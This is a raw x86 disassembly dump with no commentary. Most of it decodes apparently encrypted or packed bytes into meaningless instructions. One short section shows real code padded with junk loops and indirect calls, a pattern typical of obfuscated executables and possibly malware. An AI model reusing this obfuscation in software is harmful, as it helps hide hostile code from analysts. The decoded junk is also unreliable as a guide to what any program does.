  40cd61:	idiv   DWORD PTR [ebx]
  40cd63:	jg     0x40cddd
  40cd65:	jne    0x40cd27
  40cd67:	scas   eax,DWORD PTR es:[edi]
  40cd68:	jne    0x40cd0d
  40cd6a:	loopne 0x40cda9
  40cd6c:	pusha  
  40cd6d:	dec    ebx
  40cd6e:	test   esp,edx
  40cd70:	(bad)  
  40cd71:	and    DWORD PTR [edx],esp
  40cd73:	lods   al,BYTE PTR ds:[esi]
  40cd74:	xor    al,0xad
  40cd76:	pop    es
  40cd77:	xchg   ebp,eax
  40cd78:	ins    DWORD PTR es:[edi],dx
  40cd79:	xlat   BYTE PTR ds:[ebx]
  40cd7a:	pop    ss
  40cd7b:	sbb    eax,0xbbc8c4ad
  40cd80:	jmp    DWORD PTR [edx+edx*2-0x537a9233]
  40cd87:	fld    DWORD PTR [esi+0x21aba7bf]
  40cd8d:	pusha  
  40cd8e:	pop    ecx
  40cd8f:	xor    al,0xaa
  40cd91:	in     eax,dx
  40cd92:	cld    
  40cd93:	dec    ebp
  40cd94:	dec    esi
  40cd95:	aaa    
  40cd96:	mov    WORD PTR [edx],cs
  40cd98:	push   esp
  40cd99:	mov    edx,DWORD PTR [eax+edx*4+0x737045e1]
  40cda0:	(bad)  
  40cda2:	mov    eax,0xd064c098
  40cda7:	fucomip st,st(1)
  40cda9:	inc    eax
  40cdaa:	mov    WORD PTR [ecx+0x2eb6f950],ss
  40cdb0:	sbb    ecx,esi
  40cdb2:	jo     0x40cde5
  40cdb4:	mov    ch,BYTE PTR [di+0x42]
  40cdb8:	scas   eax,DWORD PTR es:[di]
  40cdba:	test   BYTE PTR [esi],cl
  40cdbc:	pushf  
  40cdbd:	push   ebx
  40cdbe:	add    eax,0xf483ad0f
  40cdc3:	in     eax,0x9f
  40cdc5:	jecxz  0x40cd9a
  40cdc7:	into   
  40cdc8:	loop   0x40ce05
  40cdca:	aad    0xc0
  40cdcc:	sbb    eax,0xe9c20359
  40cdd1:	outs   dx,DWORD PTR ds:[esi]
  40cdd2:	add    al,BYTE PTR [eax]
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx+0x6b6691be],eax
  40cde3:	jmp    0xc970:0x7080a567
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40ce37
  40cdee:	push   edx
  40cdef:	lods   al,BYTE PTR ds:[esi]
  40cdf0:	cmp    al,0xf4
  40cdf2:	ins    BYTE PTR es:[edi],dx
  40cdf3:	ds xchg esp,eax
  40cdf5:	sub    eax,0x4364ed23
  40cdfa:	(bad)  
  40cdfb:	adc    dh,BYTE PTR [eax+ebp*4+0x3d9fc8e0]
  40ce02:	out    dx,al
  40ce03:	inc    esp
  40ce04:	or     BYTE PTR [ecx-0x7862e1ff],ah
  40ce0a:	dec    ebp
  40ce0b:	and    al,0x2b
  40ce0d:	mov    bl,0x3a
  40ce0f:	lock fwait
  40ce11:	sti    
  40ce12:	push   edx
  40ce13:	fstp   QWORD PTR [eax+ecx*4+0x41]
  40ce17:	pop    ecx
  40ce18:	int3   
  40ce19:	inc    ecx
  40ce1a:	dec    edi
  40ce1b:	(bad)  
  40ce1c:	jle    0x40cdd2
  40ce1e:	lods   eax,DWORD PTR ds:[esi]
  40ce1f:	lds    esp,FWORD PTR [ecx]
  40ce21:	mov    eax,0xd4e81e6e
  40ce26:	sbb    DWORD PTR [esi+ebp*2+0x1a07cce4],ebp
  40ce2d:	or     eax,0x27646cd4
  40ce32:	and    BYTE PTR [edx-0x70],dh
  40ce35:	mov    ah,BYTE PTR [eax+0x333df7f3]
  40ce3b:	mov    eax,0x56f3de07
  40ce40:	mov    dl,0x8b
  40ce42:	jl     0x40ce22
  40ce44:	out    0xa3,al
  40ce46:	mov    ds:0x934d90d3,al
  40ce4b:	enter  0x4b63,0xdf
  40ce4f:	iret   
  40ce50:	stos   BYTE PTR es:[edi],al
  40ce51:	pop    ds
  40ce52:	add    BYTE PTR [ecx+eax*1],0x31
  40ce56:	jge    0x40ce1c
  40ce58:	lods   eax,DWORD PTR ds:[esi]
  40ce59:	fdivr  QWORD PTR [ebp-0x4a68aa62]
  40ce5f:	push   ebp
  40ce60:	sbb    dh,ch
  40ce62:	in     eax,dx
  40ce63:	sbb    eax,0xbd7792d5
  40ce68:	add    edx,esp
  40ce6a:	ror    DWORD PTR [esi],cl
  40ce6c:	pop    ebx
  40ce6d:	stos   DWORD PTR es:[edi],eax
  40ce6e:	jo     0x40ceb3
  40ce70:	in     al,0x32
  40ce72:	repnz mov esp,0x8e763851
  40ce78:	test   al,0x8b
  40ce7a:	enter  0xf1c6,0x15
  40ce7e:	dec    edi
  40ce7f:	cli    
  40ce80:	shr    BYTE PTR [ecx],0x68
  40ce83:	pusha  
  40ce84:	in     eax,0xc9
  40ce86:	cmp    eax,DWORD PTR [esi+eiz*8-0x202ba301]
  40ce8d:	inc    ebx
  40ce8e:	(bad)  
  40ce90:	xchg   esi,eax
  40ce91:	cdq    
  40ce92:	aad    0x81
  40ce94:	cs jnp 0x40ce65
  40ce97:	jmp    0x3814:0x31218322
  40ce9e:	inc    ebp
  40ce9f:	xchg   edx,eax
  40cea0:	and    BYTE PTR [esi+ebx*2],al
  40cea3:	inc    edx
  40cea4:	sub    ebx,DWORD PTR [edi-0x36ab56ee]
  40ceaa:	dec    eax
  40ceab:	mov    esp,0x5d5dd24a
  40ceb0:	xlat   BYTE PTR ds:[ebx]
  40ceb1:	jo     0x40cf11
  40ceb3:	xor    eax,0x72b24a62
  40ceb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb9:	mov    BYTE PTR [esi-0x6ede75b0],dh
  40cebf:	(bad)  
  40cec0:	pushf  
  40cec1:	idiv   BYTE PTR ds:0x930d11f
  40cec7:	sbb    ah,BYTE PTR [edi]
  40cec9:	sbb    bl,BYTE PTR [eax-0x54]
  40cecc:	out    dx,al
  40cecd:	or     al,0xda
  40cecf:	and    eax,0x988b0440
  40ced4:	(bad)  
  40ced5:	mov    bh,0x12
  40ced7:	aad    0xf2
  40ced9:	add    ebx,0xffffffc0
  40cedc:	mov    ebp,0xd1a40ffb
  40cee1:	mov    edx,0x7ff091a8
  40cee6:	jno    0x40cf25
  40cee8:	(bad)  
  40cee9:	js     0x40ce72
  40ceeb:	cmp    cl,BYTE PTR es:[esi]
  40ceee:	scas   al,BYTE PTR es:[edi]
  40ceef:	jl     0x40ce7d
  40cef1:	push   eax
  40cef2:	xor    eax,0xdea5ab4f
  40cef7:	dec    edx
  40cef8:	dec    esi
  40cef9:	sbb    eax,0x3f7f3327
  40cefe:	add    eax,0xeb90148f
  40cf03:	pop    es
  40cf04:	inc    BYTE PTR [esp+edx*2]
  40cf07:	jo     0x92d474ab
  40cf0d:	std    
  40cf0e:	out    dx,eax
  40cf0f:	enter  0x132e,0x39
  40cf13:	repz mov edi,0x7bc57829
  40cf19:	loope  0x40cf82
  40cf1b:	mov    ebx,0x35760396
  40cf20:	int3   
  40cf21:	(bad)  
  40cf22:	into   
  40cf23:	shr    BYTE PTR [eax+0x1c],1
  40cf26:	mov    WORD PTR [ecx],gs
  40cf28:	pop    esi
  40cf29:	mov    dh,0x9a
  40cf2b:	jnp    0x40cf8a
  40cf2d:	xor    al,0x6a
  40cf2f:	imul   edx,DWORD PTR [ebp-0x78b629ee],0xb1a336ab
  40cf39:	ror    BYTE PTR ds:0xfaf4caaf,1
  40cf3f:	or     DWORD PTR [ecx+0x4d3b27ad],esp
  40cf45:	mov    ecx,0xc51af006
  40cf4a:	or     eax,ecx
  40cf4c:	pop    ss
  40cf4d:	xchg   eax,eax
  40cf4f:	jns    0x40cee5
  40cf51:	test   DWORD PTR [ebp+0x58],esi
  40cf54:	pop    esp
  40cf55:	add    eax,0xa1b55297
  40cf5a:	fdiv   QWORD PTR ds:[esi]
  40cf5d:	(bad)  
  40cf5f:	mov    ch,0xf8
  40cf61:	in     eax,dx
  40cf62:	cmp    bl,dl
  40cf64:	pop    ecx
  40cf65:	mov    eax,0x778da305
  40cf6a:	ret    
  40cf6b:	out    0x55,eax
  40cf6d:	icebp  
  40cf6e:	jb     0x40cf72
  40cf70:	in     eax,dx
  40cf71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf72:	pop    ebx
  40cf73:	fs push edi
  40cf75:	loop   0x40cf23
  40cf77:	sbb    edx,DWORD PTR [edx]
  40cf79:	repnz loopne 0x40cf32
  40cf7c:	push   0x595ba803
  40cf81:	jl     0x40cf66
  40cf83:	xchg   esi,eax
  40cf84:	push   es
  40cf85:	loop   0x40cf5a
  40cf87:	js     0x40cf4c
  40cf89:	xor    BYTE PTR [esi],bl
  40cf8b:	xlat   BYTE PTR ds:[ebx]
  40cf8c:	loopne 0x40cf6a
  40cf8e:	jnp    0x40cfda
  40cf90:	jmp    0x305f:0xa3bf70ba
  40cf97:	adc    DWORD PTR [edx+0x55be8e62],esp
  40cf9d:	push   esp
  40cf9e:	fwait
  40cf9f:	jb     0x40cfc8
  40cfa1:	add    eax,0xb728bf45
  40cfa6:	popf   
  40cfa7:	lds    eax,FWORD PTR [ebx+0x439a99dc]
  40cfad:	fstp   TBYTE PTR [ecx-0x5f]
  40cfb0:	inc    ecx
  40cfb1:	sub    eax,0xb911961e
  40cfb6:	pop    esi
  40cfb7:	xchg   ebx,eax
  40cfb8:	and    al,0xfd
  40cfba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfbb:	(bad)  
  40cfbc:	frstor [edi-0x43cccba8]
  40cfc2:	mov    esp,0x196f536c
  40cfc7:	inc    ebp
  40cfc8:	ret    
  40cfc9:	xchg   DWORD PTR [esi-0x5a],esp
  40cfcc:	(bad)  [eax]
  40cfce:	inc    ebp
  40cfcf:	inc    edi
  40cfd0:	xor    eax,0x65b17e4a
  40cfd5:	data16 scas al,BYTE PTR es:[edi]
  40cfd7:	mov    edx,0x6211e0a5
  40cfdc:	jge    0x40d00b
  40cfde:	outs   dx,DWORD PTR ds:[esi]
  40cfdf:	fsub   DWORD PTR [ebx]
  40cfe1:	add    DWORD PTR [edi-0x5a],esi
  40cfe4:	adc    al,0x4b
  40cfe6:	pop    ebp
  40cfe7:	jae    0x40d00f
  40cfe9:	adc    ah,0x45
  40cfec:	fld    TBYTE PTR [ebp+0x5974b01c]
  40cff2:	fidivr DWORD PTR [esi-0x44308c91]
  40cff8:	sahf   
  40cff9:	aam    0xed
  40cffb:	test   BYTE PTR [ecx+esi*4+0x1a61ad19],dh
  40d002:	ss stos BYTE PTR es:[edi],al
  40d004:	pop    es
  40d005:	pop    eax
  40d006:	(bad)  
  40d008:	push   ebx
  40d009:	cmc    
  40d00a:	add    al,0xb2
  40d00c:	fnstcw WORD PTR [edi]
  40d00e:	adc    dh,BYTE PTR [edi-0x6]
  40d011:	sub    eax,0x8a496dd3
  40d016:	iret   
  40d017:	mov    cl,BYTE PTR [edi-0x1282c10f]
  40d01d:	ret    
  40d01e:	cmp    eax,0x89f7785f
  40d023:	aam    0xb8
  40d025:	push   esi
  40d026:	mov    DWORD PTR [edx],ebp
  40d028:	not    BYTE PTR [edi]
  40d02a:	mov    al,ds:0x523f8623
  40d02f:	in     eax,dx
  40d030:	cs xchg edx,eax
  40d032:	inc    edx
  40d033:	adc    cl,BYTE PTR [eax]
  40d035:	nop
  40d036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d038:	loope  0x40d004
  40d03a:	ror    BYTE PTR [eax],cl
  40d03c:	jmp    0x24cb:0xba9c47a9
  40d043:	mov    ebp,0x41621ca3
  40d048:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4343be
  40d088:	mov    ecx,DWORD PTR ds:0x432972
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434396,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434396,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434396,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432c6a
  40d0d1:	cmp    DWORD PTR ds:0x434396,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434396
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434396,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434396
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434396,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434372,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434372
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434372,ecx
  40d118:	cmp    DWORD PTR ds:0x434372,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434372,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432dc6
  40d137:	call   DWORD PTR ds:0x4329ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432e6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434431
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43437e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432dde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432704,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434421,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43438a,0x11
  40d197:	cmp    DWORD PTR ds:0x43438a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43438a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432c6e
  40d1c4:	cmp    DWORD PTR ds:0x43438a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43438a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43438a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43438a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43438a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432dd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434396
  40d1fe:	mov    DWORD PTR ds:0x432dd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43436e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434425,0x43436a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434376,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434415,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434421,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434421
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434421,ecx
  40d255:	cmp    DWORD PTR ds:0x434421,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434421,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4329f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4326fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4326fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4326fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432d22
  40d2ba:	cmp    DWORD PTR ds:0x4326fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4326fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4326fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4326fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4326fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4326f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434429
  40d2fa:	add    DWORD PTR ds:0x434392,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0x66a9624d
  40d319:	fild   DWORD PTR [esi+edi*2-0x73]
  40d31d:	jo     0x40d38f
  40d31f:	dec    ecx
  40d320:	jge    0x40d392
  40d322:	jo     0x40d39f
  40d324:	imul   eax,ecx,0xffffff8f
  40d327:	aas    
  40d328:	icebp  
  40d329:	push   0xa0cb30e3
  40d32e:	retf   0x76e
  40d331:	xchg   ebx,eax
  40d332:	sub    BYTE PTR [ecx+0x75],bl
  40d335:	pop    edi
  40d336:	mov    BYTE PTR [edi*2-0x7472f3dc],al
  40d33d:	and    BYTE PTR [edi-0xc11a29d],dh
  40d343:	rol    BYTE PTR [ecx],1
  40d345:	mov    ds:0x8276c785,al
  40d34a:	cdq    
  40d34b:	and    eax,0x14d1db60
  40d350:	cmp    ah,dl
  40d352:	lahf   
  40d353:	push   es
  40d354:	cli    
  40d355:	mov    ebx,0xfe6cb1d8
  40d35a:	add    al,bl
  40d35c:	mov    esp,DWORD PTR [edi-0x2578892e]
  40d362:	push   ss
  40d363:	push   ecx
  40d364:	push   0x73
  40d366:	pop    eax
  40d367:	inc    edi
  40d368:	xor    BYTE PTR [ebp-0x22],0xa6
  40d36c:	stos   BYTE PTR es:[edi],al
  40d36d:	xchg   al,ah
  40d36f:	(bad)  
  40d370:	js     0x40d3be
  40d372:	xor    eax,0x80e6f8e2
  40d377:	dec    ebp
  40d378:	(bad)  
  40d37a:	mov    cl,0xb7
  40d37c:	call   0x1579ece3
  40d381:	mov    al,0x9b
  40d383:	inc    DWORD PTR [eax-0x25]
  40d386:	sub    esi,DWORD PTR [eax-0x12]
  40d389:	jo     0x40d385
  40d38b:	adc    dh,BYTE PTR [eax+edx*1-0x1b2132e6]
  40d392:	and    DWORD PTR ss:0x3c6600fd,esi
  40d399:	jae    0x40d3e3
  40d39b:	sbb    esi,DWORD PTR [esi-0x6ff0bc07]
  40d3a1:	xor    al,0x67
  40d3a3:	icebp  
  40d3a4:	pop    ds
  40d3a5:	adc    bl,BYTE PTR [esi]
  40d3a7:	jmp    0xd7ca:0xf8cf08e9
  40d3ae:	jnp    0x40d40b
  40d3b0:	inc    eax
  40d3b1:	add    BYTE PTR [esi+0x31894ea1],al
  40d3b7:	push   0xffffffdb
  40d3b9:	push   ecx
  40d3ba:	push   cs
  40d3bb:	cmc    
  40d3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3bd:	retf   0x1876
  40d3c0:	inc    edi
  40d3c1:	mov    bh,0xf
  40d3c3:	jnp    0x40d3f4
  40d3c5:	jbe    0x40d3f6
  40d3c7:	loope  0x40d3c8
  40d3c9:	clc    
  40d3ca:	xor    al,0x16
  40d3cc:	int    0x61
  40d3ce:	adc    bl,BYTE PTR [edi+0x11]
  40d3d1:	cli    
  40d3d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3d3:	out    0xfe,eax
  40d3d5:	ss push cs
  40d3d7:	cmp    cl,bl
  40d3d9:	fst    QWORD PTR [eax]
  40d3db:	ja     0x40d398
  40d3dd:	outs   dx,BYTE PTR ds:[esi]
  40d3de:	pop    esi
  40d3df:	mov    WORD PTR [ecx],?
  40d3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3e2:	jb     0x40d3df
  40d3e4:	mov    esi,0x7ea9e4e7
  40d3e9:	pop    ss
  40d3ea:	fs mov ebx,0x20b8d8ee
  40d3f0:	adc    ebp,edx
  40d3f2:	data16 mov al,ds:0x8a2a43d
  40d3f8:	xchg   ecx,ebx
  40d3fa:	sbb    al,0xe7
  40d3fc:	jg     0x40d418
  40d3fe:	es scas eax,DWORD PTR es:[edi]
  40d400:	cs shr BYTE PTR ds:[esi+0x29bc6aa1],0x1d
  40d409:	clc    
  40d40a:	or     ebx,DWORD PTR [ecx]
  40d40c:	push   edi
  40d40d:	data16 ja 0x40d40b
  40d410:	jno    0x40d3c9
  40d412:	pop    es
  40d413:	stos   DWORD PTR es:[edi],eax
  40d414:	fbstp  TBYTE PTR [ebp+edi*2-0x7d7d7a96]
  40d41b:	cmp    al,0x72
  40d41d:	clc    
  40d41e:	pop    ebp
  40d41f:	pusha  
  40d420:	push   ecx
  40d421:	pop    ebx
  40d422:	push   ss
  40d423:	jmp    0x40d442
  40d425:	loop   0x40d3b6
  40d427:	sti    
  40d428:	mov    dh,0xa9
  40d42a:	cs mov dl,0xbf
  40d42d:	leave  
  40d42e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d42f:	sbb    cl,bl
  40d431:	adc    eax,0x4243cac4
  40d436:	cmp    dh,BYTE PTR [edx]
  40d438:	jbe    0x40d441
  40d43a:	jbe    0x40d451
  40d43c:	pop    esp
  40d43d:	xor    al,0xc1
  40d43f:	jae    0x40d42a
  40d441:	push   eax
  40d442:	shr    DWORD PTR [ebx],0xe5
  40d445:	nop
  40d446:	and    DWORD PTR [edi-0x209d11eb],edi
  40d44c:	scas   al,BYTE PTR es:[edi]
  40d44d:	(bad)  
  40d44e:	popf   
  40d44f:	or     al,0x92
  40d451:	int3   
  40d452:	daa    
  40d453:	inc    edx
  40d454:	sub    cl,ah
  40d456:	add    al,0x77
  40d458:	mov    ds:0xc35ba1e0,al
  40d45d:	pop    ds
  40d45e:	pop    ss
  40d45f:	fld    st(4)
  40d461:	jecxz  0x40d42d
  40d463:	leave  
  40d464:	and    ebx,edi
  40d466:	jnp    0x40d4dc
  40d468:	push   eax
  40d469:	into   
  40d46a:	mov    dh,0x82
  40d46c:	add    eax,0x91fdc7c7
  40d471:	mov    dh,0xa
  40d473:	ret    0xbc12
  40d476:	sub    eax,0x9aebc1a7
  40d47b:	stos   BYTE PTR es:[edi],al
  40d47c:	mov    ebp,0xfd195e43
  40d481:	mov    ecx,0x12299762
  40d486:	pop    edi
  40d487:	push   es
  40d488:	sbb    ebx,DWORD PTR [eax+edi*8+0x4795a206]
  40d48f:	push   edi
  40d490:	sub    eax,ecx
  40d492:	cs xor edi,ebx
  40d495:	push   edi
  40d496:	int3   
  40d497:	or     cl,BYTE PTR [edx+0x75]
  40d49a:	mov    BYTE PTR [edi],ch
  40d49c:	sbb    bh,bl
  40d49e:	cpuid  
  40d4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4a1:	cmp    eax,0xa63b5d3c
  40d4a6:	and    al,0x89
  40d4a8:	shl    edi,0xd6
  40d4ab:	xchg   BYTE PTR [eax],bl
  40d4ad:	add    BYTE PTR [esi+0x5eac6537],dh
  40d4b3:	cmp    dl,BYTE PTR ds:0xb97f4548
  40d4b9:	add    eax,0x232cdfe6
  40d4be:	inc    esp
  40d4bf:	or     al,BYTE PTR [ebx]
  40d4c1:	mov    cs,WORD PTR [edi]
  40d4c3:	neg    esp
  40d4c5:	or     BYTE PTR [esi-0x72],dl
  40d4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c9:	std    
  40d4ca:	dec    esi
  40d4cb:	clc    
  40d4cc:	push   ebp
  40d4cd:	inc    esp
  40d4ce:	mov    BYTE PTR [eax],ch
  40d4d0:	lods   eax,DWORD PTR ds:[esi]
  40d4d1:	call   0x8c6dd9af
  40d4d6:	out    dx,al
  40d4d7:	or     BYTE PTR [ecx+0x57],cl
  40d4da:	icebp  
  40d4db:	in     eax,dx
  40d4dc:	sbb    dl,ah
  40d4de:	or     BYTE PTR [ebp+edi*8-0xa],ch
  40d4e2:	xor    ebx,esi
  40d4e4:	push   esi
  40d4e5:	clc    
  40d4e6:	and    eax,0x7394ee1f
  40d4eb:	daa    
  40d4ec:	in     al,0x9a
  40d4ee:	fs push edx
  40d4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f1:	mov    ebx,ebx
  40d4f3:	imul   esi,DWORD PTR [edx-0x6c5abe09],0xffffff9d
  40d4fa:	push   cs
  40d4fb:	dec    eax
  40d4fc:	jl     0x40d48d
  40d4fe:	xor    BYTE PTR [ecx],ch
  40d500:	shl    DWORD PTR [esi],cl
  40d502:	sub    BYTE PTR [edi-0x7a],dl
  40d505:	mov    esp,0x1aed8463
  40d50a:	rol    DWORD PTR [ebp+0x29],1
  40d50d:	jns    0x40d534
  40d50f:	mov    ebx,0x9270e180
  40d514:	fnstsw WORD PTR [eax+0x41]
  40d517:	pop    ebp
  40d518:	das    
  40d519:	adc    dh,bh
  40d51b:	xor    BYTE PTR [esi+eiz*1+0x40],0xc8
  40d520:	scas   al,BYTE PTR es:[edi]
  40d521:	rol    BYTE PTR [ecx+eax*2],1
  40d524:	push   edi
  40d525:	push   esi
  40d526:	add    ebx,DWORD PTR [ebx+ecx*1+0x64]
  40d52a:	sbb    eax,0xa5e82092
  40d52f:	lods   eax,DWORD PTR ds:[esi]
  40d530:	cmp    DWORD PTR [edi],edx
  40d532:	inc    eax
  40d533:	and    eax,0xc3ed8cf9
  40d538:	lock scas eax,DWORD PTR es:[edi]
  40d53a:	cmp    ah,dh
  40d53c:	leave  
  40d53d:	aas    
  40d53e:	dec    esi
  40d53f:	dec    esi
  40d540:	sbb    eax,0xf55db21
  40d546:	out    dx,eax
  40d547:	daa    
  40d548:	stc    
  40d549:	jo     0x40d51f
  40d54b:	xor    bl,BYTE PTR ds:[edi-0x6e]
  40d54f:	pop    es
  40d550:	or     al,0x16
  40d552:	sbb    eax,0xdaaeffd3
  40d557:	mov    edi,0xb475853d
  40d55c:	fcomp  QWORD PTR ss:[esi-0x77]
  40d560:	or     al,0xb9
  40d562:	sbb    BYTE PTR [eax],ah
  40d564:	std    
  40d565:	lods   eax,DWORD PTR ds:[esi]
  40d566:	xchg   esp,eax
  40d567:	push   esi
  40d568:	pop    ss
  40d569:	cld    
  40d56a:	test   bh,0xc
  40d56d:	pop    ss
  40d56e:	test   DWORD PTR [edi+0x522ca76a],esi
  40d574:	jmp    0x40d51a
  40d576:	or     dh,BYTE PTR [ebp-0x32dba344]
  40d57c:	and    eax,0x95218810
  40d581:	push   ds
  40d582:	ret    0x3827
  40d585:	repnz ss mov esi,0xed47eb82
  40d58c:	mov    bl,BYTE PTR [eax-0x23]
  40d58f:	mov    eax,0x51098227
  40d594:	pop    ebp
  40d595:	leave  
  40d596:	test   edx,eax
  40d598:	popa   
  40d599:	mov    ecx,esi
  40d59b:	xchg   BYTE PTR [esi+eiz*2-0x7e],ah
  40d59f:	push   0x60140238
  40d5a4:	mov    bh,dl
  40d5a6:	(bad)  
  40d5a7:	popa   
  40d5a8:	ins    DWORD PTR es:[edi],dx
  40d5a9:	push   ecx
  40d5aa:	xchg   ecx,eax
  40d5ab:	ins    DWORD PTR es:[edi],dx
  40d5ac:	fild   WORD PTR [ecx-0x1c]
  40d5af:	aaa    
  40d5b0:	inc    edi
  40d5b1:	add    al,0x8d
  40d5b3:	test   DWORD PTR [ecx],0xaa0972ca
  40d5b9:	mov    ds:0xb88e564a,al
  40d5be:	cmp    edi,DWORD PTR [esi]
  40d5c0:	jge    0x40d560
  40d5c2:	mov    esp,0xed98b084
  40d5c7:	inc    edx
  40d5c8:	loop   0x40d62f
  40d5ca:	fcmovu st,st(6)
  40d5cc:	lds    ebp,FWORD PTR [edx-0x5386361]
  40d5d2:	aaa    
  40d5d3:	sbb    al,0xd3
  40d5d5:	outs   dx,BYTE PTR ds:[esi]
  40d5d6:	fistp  DWORD PTR [ebp+0x7f]
